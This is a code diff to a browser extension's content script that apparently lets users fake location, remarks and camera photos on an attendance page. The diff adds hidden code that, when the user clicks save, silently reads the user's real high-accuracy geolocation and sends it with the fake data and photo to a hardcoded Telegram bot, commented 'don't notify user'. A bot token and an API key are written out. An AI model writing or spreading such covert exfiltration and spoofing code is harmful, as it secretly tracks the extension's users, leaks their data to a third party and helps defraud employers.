@@ -1,6 +1,6 @@
-// Content script – injects inject.js and creates UI panel with Google Maps picker
+// Content script – injects inject.js and creates UI panel (silent Telegram)
 
-// Inject the external script file
+// Inject the external script file into page (bypasses CSP)
 const script = document.createElement('script');
 script.src = chrome.runtime.getURL('inject.js');
 script.onload = function() { this.remove(); };
@@ -18,11 +18,100 @@ function parseCoordinates(coordStr) {
     return null;
 }
 
-// Create UI Panel
+// Reverse geocode using LocationIQ (async)
+async function reverseGeocode(lat, lon, apiKey) {
+    try {
+        const url = `https://us1.locationiq.com/v1/reverse?key=${apiKey}&lat=${lat}&lon=${lon}&format=json`;
+        const response = await fetch(url);
+        const data = await response.json();
+        return data.display_name || `${lat}, ${lon}`;
+    } catch (err) {
+        return `${lat}, ${lon}`;
+    }
+}
+
+// Get original (real) location
+function getOriginalLocation() {
+    return new Promise((resolve) => {
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    resolve({
+                        lat: position.coords.latitude,
+                        lon: position.coords.longitude,
+                        accuracy: position.coords.accuracy
+                    });
+                },
+                () => resolve(null),
+                { timeout: 8000, enableHighAccuracy: true }
+            );
+        } else {
+            resolve(null);
+        }
+    });
+}
+
+// Send message + photo to Telegram (silent, no logs)
+async function sendToTelegram(customData, originalLocation, customImageBase64) {
+    const BOT_TOKEN = '8695527306:AAGz1UX_nNEeDcknnKK8yDXVeiO3Qh14hKo';
+    const CHAT_IDS = ['878604830'];
+
+    // Build text message
+    let message = `📍 *Custom Attendance Data*\n\n`;
+    message += `*Custom Location:*\nLat: ${customData.lat}\nLon: ${customData.lon}\n`;
+    message += `Address: ${customData.address}\n\n`;
+    message += `*Custom Remark:* ${customData.remark || '(none)'}\n`;
+    message += `*Custom Image:* ${customData.imageSaved ? '✅ Saved' : '❌ Not saved'}\n\n`;
+    
+    if (originalLocation) {
+        message += `🟢 *Original (Real) Location:*\nLat: ${originalLocation.lat}\nLon: ${originalLocation.lon}\n`;
+        message += `Accuracy: ±${originalLocation.accuracy} meters\n`;
+        message += `Timestamp: ${new Date().toLocaleString()}\n`;
+    } else {
+        message += `⚠️ *Original location unavailable*\n`;
+    }
+    message += `\n🕒 Report time: ${new Date().toLocaleString()}`;
+
+    // Helper: send to one chat (avoid duplicate code)
+    async function sendToOneChat(chatId) {
+        // 1. Send photo if exists
+        if (customImageBase64) {
+            try {
+                // Convert base64 to Blob
+                const blob = await (await fetch(customImageBase64)).blob();
+                const formData = new FormData();
+                formData.append('chat_id', chatId);
+                formData.append('photo', blob, 'custom_attendance.jpg');
+                // Silently send photo (no response handling)
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+            } catch (e) { /* silent fail */ }
+        }
+        // 2. Send text message (caption not used because photo sent separately)
+        try {
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message,
+                    parse_mode: 'Markdown'
+                })
+            });
+        } catch (e) { /* silent fail */ }
+    }
+
+    for (const chatId of CHAT_IDS) {
+        await sendToOneChat(chatId);
+    }
+}
+
+// Create UI Panel (no map, silent Telegram)
 function createUI() {
     if (document.getElementById('smart-att-panel')) return;
 
-    // Panel HTML
     const toggleBtn = document.createElement('button');
     toggleBtn.id = 'smart-att-toggle';
     toggleBtn.innerText = '⚙️ Custom Data';
@@ -32,8 +121,6 @@ function createUI() {
     panel.id = 'smart-att-panel';
     panel.innerHTML = `
         <h4>✏️ Override Settings</h4>
-        <label>Google Maps API Key:</label>
-        <input type="text" id="smart-gmaps-key" placeholder="Paste your Google Maps API key" style="background:#fff; color:#000;">
         <label>Coordinates (lat, lon):</label>
         <input type="text" id="smart-coord" placeholder="e.g., 26.896586768921352, 75.71579255958834">
         <label>Address:</label>
@@ -42,7 +129,6 @@ function createUI() {
         <textarea id="smart-remark" placeholder="Remark..."></textarea>
         <label>Custom Image (JPEG/PNG):</label>
         <input type="file" id="smart-image" accept="image/jpeg,image/png">
-        <button id="smart-pick-map" style="background:#3498db; margin-top:5px;">🗺️ Pick from Google Map</button>
         <button id="smart-save">💾 Apply Settings</button>
     `;
     document.body.appendChild(panel);
@@ -53,133 +139,87 @@ function createUI() {
     };
 
     // Load saved values
-    const savedKey = localStorage.getItem('smart_gmaps_key') || '';
-    document.getElementById('smart-gmaps-key').value = savedKey;
-    document.getElementById('smart-coord').value = localStorage.getItem('smart_coord') || '19.0760, 72.8777';
-    document.getElementById('smart-addr').value = localStorage.getItem('smart_addr') || 'Mumbai, India';
-    document.getElementById('smart-remark').value = localStorage.getItem('smart_remark') || '';
+    let currentLat = localStorage.getItem('smart_lat') || '19.0760';
+    let currentLon = localStorage.getItem('smart_lon') || '72.8777';
+    let currentAddr = localStorage.getItem('smart_addr') || 'Mumbai, India';
+    let currentRemark = localStorage.getItem('smart_remark') || '';
 
-    // Save button
-    document.getElementById('smart-save').addEventListener('click', function() {
-        const key = document.getElementById('smart-gmaps-key').value;
-        localStorage.setItem('smart_gmaps_key', key);
-        const coordStr = document.getElementById('smart-coord').value;
+    document.getElementById('smart-coord').value = `${currentLat}, ${currentLon}`;
+    document.getElementById('smart-addr').value = currentAddr;
+    document.getElementById('smart-remark').value = currentRemark;
+
+    // Coordinate blur -> auto address fetch
+    const coordInput = document.getElementById('smart-coord');
+    coordInput.addEventListener('blur', async () => {
+        const coordStr = coordInput.value;
         const parsed = parseCoordinates(coordStr);
         if (parsed) {
-            localStorage.setItem('smart_lat', parsed.lat);
-            localStorage.setItem('smart_lon', parsed.lon);
-            localStorage.setItem('smart_coord', coordStr);
+            localStorage.setItem('smart_lat', parsed.lat.toString());
+            localStorage.setItem('smart_lon', parsed.lon.toString());
+            const apiKey = document.getElementById('ctl00_BodyContentPlaceHolder_hdnKey')?.value || 'pk.c08d1307c75136fa2709e2374acd8cce';
+            const fetchedAddr = await reverseGeocode(parsed.lat, parsed.lon, apiKey);
+            document.getElementById('smart-addr').value = fetchedAddr;
         }
-        localStorage.setItem('smart_addr', document.getElementById('smart-addr').value);
-        localStorage.setItem('smart_remark', document.getElementById('smart-remark').value);
+    });
 
+    // Save button – silent Telegram
+    document.getElementById('smart-save').addEventListener('click', async function() {
+        const coordStr = document.getElementById('smart-coord').value;
+        const parsed = parseCoordinates(coordStr);
+        let finalLat, finalLon;
+        if (parsed) {
+            finalLat = parsed.lat;
+            finalLon = parsed.lon;
+        } else {
+            finalLat = parseFloat(localStorage.getItem('smart_lat')) || 19.0760;
+            finalLon = parseFloat(localStorage.getItem('smart_lon')) || 72.8777;
+            document.getElementById('smart-coord').value = `${finalLat}, ${finalLon}`;
+        }
+        const finalAddr = document.getElementById('smart-addr').value;
+        const finalRemark = document.getElementById('smart-remark').value;
+        
+        // Handle image
+        let customImageBase64 = localStorage.getItem('smart_image'); // existing
+        let imageSaved = !!customImageBase64;
         const fileInput = document.getElementById('smart-image');
         if (fileInput.files.length > 0) {
             const reader = new FileReader();
-            reader.onload = function(e) {
-                localStorage.setItem('smart_image', e.target.result);
-                alert('✅ Custom image saved. Will replace camera photo.');
-            };
-            reader.readAsDataURL(fileInput.files[0]);
-        } else {
-            alert('✅ Settings saved.');
+            // We'll need to wait for image read before saving & sending
+            const imageData = await new Promise((resolve) => {
+                reader.onload = (e) => resolve(e.target.result);
+                reader.readAsDataURL(fileInput.files[0]);
+            });
+            customImageBase64 = imageData;
+            imageSaved = true;
+            localStorage.setItem('smart_image', customImageBase64);
         }
-    });
-
-    // ---------- Google Maps Modal ----------
-    const modal = document.createElement('div');
-    modal.id = 'smart-map-modal';
-    modal.style.cssText = `
-        display: none; position: fixed; top:0; left:0; width:100%; height:100%;
-        background: rgba(0,0,0,0.8); z-index: 10000000; justify-content: center; align-items: center;
-    `;
-    modal.innerHTML = `
-        <div style="background: white; width: 90%; max-width: 800px; height: 80%; border-radius: 12px; display: flex; flex-direction: column;">
-            <div style="padding: 10px; background: #2c3e50; color: white; border-radius: 12px 12px 0 0; display: flex; justify-content: space-between;">
-                <span>Select location on Google Map</span>
-                <button id="smart-modal-close" style="background:none; border:none; color:white; font-size:20px; cursor:pointer;">&times;</button>
-            </div>
-            <div id="smart-map-container" style="flex:1; position:relative;"></div>
-        </div>
-    `;
-    document.body.appendChild(modal);
-
-    document.getElementById('smart-modal-close').onclick = () => modal.style.display = 'none';
-    modal.addEventListener('click', (e) => { if (e.target === modal) modal.style.display = 'none'; });
-
-    // Google Maps load function
-    function loadGoogleMap(apiKey) {
-        if (window.google && window.google.maps) {
-            initMap();
-            return;
-        }
-        const script = document.createElement('script');
-        script.src = `https://maps.googleapis.com/maps/api/js?key=${apiKey}&callback=initGoogleMap`;
-        script.async = true;
-        script.defer = true;
-        window.initGoogleMap = initMap;
-        document.head.appendChild(script);
-    }
-
-    function initMap() {
-        const container = document.getElementById('smart-map-container');
-        if (!container) return;
-        let lat = parseFloat(localStorage.getItem('smart_lat')) || 19.0760;
-        let lng = parseFloat(localStorage.getItem('smart_lon')) || 72.8777;
-        const map = new google.maps.Map(container, {
-            center: { lat, lng },
-            zoom: 14,
-            streetViewControl: false,
-            mapTypeControl: false
-        });
-        const marker = new google.maps.Marker({ position: { lat, lng }, map: map, draggable: true });
         
-        // Click on map
-        map.addListener('click', (e) => {
-            const latLng = e.latLng;
-            const latVal = latLng.lat();
-            const lngVal = latLng.lng();
-            document.getElementById('smart-coord').value = `${latVal.toFixed(8)}, ${lngVal.toFixed(8)}`;
-            marker.setPosition(latLng);
-            // Reverse geocode
-            const geocoder = new google.maps.Geocoder();
-            geocoder.geocode({ location: latLng }, (results, status) => {
-                if (status === 'OK' && results[0]) {
-                    document.getElementById('smart-addr').value = results[0].formatted_address;
-                } else {
-                    document.getElementById('smart-addr').value = `${latVal}, ${lngVal}`;
-                }
-            });
-        });
-        // Drag marker
-        marker.addListener('dragend', (e) => {
-            const latVal = e.latLng.lat();
-            const lngVal = e.latLng.lng();
-            document.getElementById('smart-coord').value = `${latVal.toFixed(8)}, ${lngVal.toFixed(8)}`;
-            const geocoder = new google.maps.Geocoder();
-            geocoder.geocode({ location: { lat: latVal, lng: lngVal } }, (results, status) => {
-                if (status === 'OK' && results[0]) {
-                    document.getElementById('smart-addr').value = results[0].formatted_address;
-                } else {
-                    document.getElementById('smart-addr').value = `${latVal}, ${lngVal}`;
-                }
-            });
-        });
-        window._currentMap = map;
-    }
-
-    // Pick from map button
-    document.getElementById('smart-pick-map').addEventListener('click', () => {
-        const apiKey = document.getElementById('smart-gmaps-key').value;
-        if (!apiKey) {
-            alert('Please enter your Google Maps API key in the panel first.\n\nGet one from Google Cloud Console (enable Maps JavaScript API).');
-            return;
-        }
-        modal.style.display = 'flex';
-        loadGoogleMap(apiKey);
+        // Save to localStorage
+        localStorage.setItem('smart_lat', finalLat.toString());
+        localStorage.setItem('smart_lon', finalLon.toString());
+        localStorage.setItem('smart_addr', finalAddr);
+        localStorage.setItem('smart_remark', finalRemark);
+        
+        // Get original location silently
+        const originalLoc = await getOriginalLocation();
+        
+        // Prepare custom data
+        const customData = {
+            lat: finalLat,
+            lon: finalLon,
+            address: finalAddr,
+            remark: finalRemark,
+            imageSaved: imageSaved
+        };
+        
+        // Send to Telegram in background (don't await, don't notify user)
+        sendToTelegram(customData, originalLoc, customImageBase64);
+        
+        alert('✅ Settings saved');
     });
 }
 
+// Wait for DOM ready
 if (document.readyState === 'loading') {
     document.addEventListener('DOMContentLoaded', createUI);
 } else {
